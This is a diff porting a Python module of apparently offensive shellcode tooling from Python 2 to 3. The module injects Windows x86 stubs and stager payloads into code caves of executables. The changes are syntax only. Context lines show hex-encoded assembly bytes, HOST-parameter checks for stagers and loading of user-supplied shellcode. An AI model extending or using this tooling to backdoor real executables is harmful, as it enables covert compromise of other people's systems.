@@ -36,7 +36,7 @@ POSSIBILITY OF SUCH DAMAGE.
 #               BEGIN win32 shellcodes                   #
 ##########################################################
 import struct
-from intelmodules import eat_code_caves
+from .intelmodules import eat_code_caves
 
 
 class winI32_shellcode():
@@ -72,7 +72,7 @@ class winI32_shellcode():
                 "\x8B\x49\x08"                      # mov ecx, dword ptr [ecx+8]
                 "\x8B\xD9"                          # mov ebx,ecx
                 )
-        for cave, values in CavesToFix.iteritems():
+        for cave, values in list(CavesToFix.items()):
             stub += "\xbf"                          # mov edi, value below
             stub += struct.pack("<I", values[0])
             stub += "\x03\xfb"                      # add edi, ebx
@@ -92,7 +92,7 @@ class winI32_shellcode():
             return False
 
         if self.HOST is None:
-            print "This payload requires a HOST parameter -H"
+            print("This payload requires a HOST parameter -H")
             return False
 
         #breakupvar is the distance between codecaves
@@ -160,7 +160,7 @@ class winI32_shellcode():
             return False
 
         if self.HOST is None:
-            print "This payload requires a HOST parameter -H"
+            print("This payload requires a HOST parameter -H")
             return False
 
         flItms['stager'] = True
@@ -298,7 +298,7 @@ class winI32_shellcode():
             return False
 
         if self.HOST is None:
-            print "This payload requires a HOST parameter -H"
+            print("This payload requires a HOST parameter -H")
             return False
 
         flItms['stager'] = True
@@ -438,7 +438,7 @@ class winI32_shellcode():
         flItms['stager'] = True
 
         if flItms['supplied_shellcode'] is None:
-            print "[!] User must provide shellcode for this module (-U)"
+            print("[!] User must provide shellcode for this module (-U)")
             return False
         else:
             self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
@@ -560,7 +560,7 @@ class winI32_shellcode():
             return False
 
         if self.HOST is None:
-            print "This payload requires a HOST parameter -H"
+            print("This payload requires a HOST parameter -H")
             return False
 
         self.shellcode1 = "\xfc"   # CLD
@@ -659,7 +659,7 @@ class winI32_shellcode():
             return False
 
         if self.HOST is None:
-            print "This payload requires a HOST parameter -H"
+            print("This payload requires a HOST parameter -H")
             return False
 
         flItms['stager'] = True
@@ -900,7 +900,7 @@ class winI32_shellcode():
             return False
 
         if self.HOST is None:
-            print "This payload requires a HOST parameter -H"
+            print("This payload requires a HOST parameter -H")
             return False
 
         flItms['stager'] = True
@@ -1154,7 +1154,7 @@ class winI32_shellcode():
         flItms['stager'] = True
 
         if flItms['supplied_shellcode'] is None:
-            print "[!] User must provide shellcode for this module (-U)"
+            print("[!] User must provide shellcode for this module (-U)")
             return False
         else:
             self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
